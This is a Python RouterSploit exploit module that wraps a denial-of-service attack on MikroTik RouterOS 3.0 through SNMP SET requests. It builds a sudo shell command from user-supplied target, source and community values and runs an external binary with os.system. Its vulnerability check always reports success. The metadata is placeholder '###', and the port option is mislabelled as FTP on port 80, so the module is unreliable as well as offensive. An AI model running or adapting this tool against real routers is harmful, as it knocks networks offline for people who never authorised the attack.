

import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):



    __info__ = {

        "name": "MikroTik_RouterOS_3.0-SNMP_SET_Denial_of_Service",

        "description": "### "
                       "### "
                       "### ",

        "authors": (

            "###",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "###",

        ),

        "devices": (

            "MicroTik, MikroTik_RouterOS_3.0-SNMP_SET_Denial_of_Service"
        ),
    }


    target = OptIP("", "dest_addr IPv4 or IPv6 address")
    port = OptPort(80, "Target FTP port")
    source = OptIP("", "source_addr IPv4 or IPv6 address")
    community = OptString("","community ")
    
    def run(self):

        if self.check():
            if self.source and self.target and self.community:
                
                print_success("Target seems to be vulnerable")
                text = os.path.basename(__file__)
                print(text)
                path = os.path.realpath(__file__)
                path = path.replace(text,'')
                path = path.replace('\\','/')
                path1 = 'cd {}'.format(path)
                fileName = 'sudo ./{} -s {} -d {} -c {}'.format('MikroTik_RouterOS_3_0-SNMP_SET_Denial_of_Service',self.source,self.target,self.community)
                path2 = path1 + " && " + fileName
                #print(path2)
                os.system(path2)
                
            else:
                print_error("Exploit failed - source or dest or community is none")

            
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
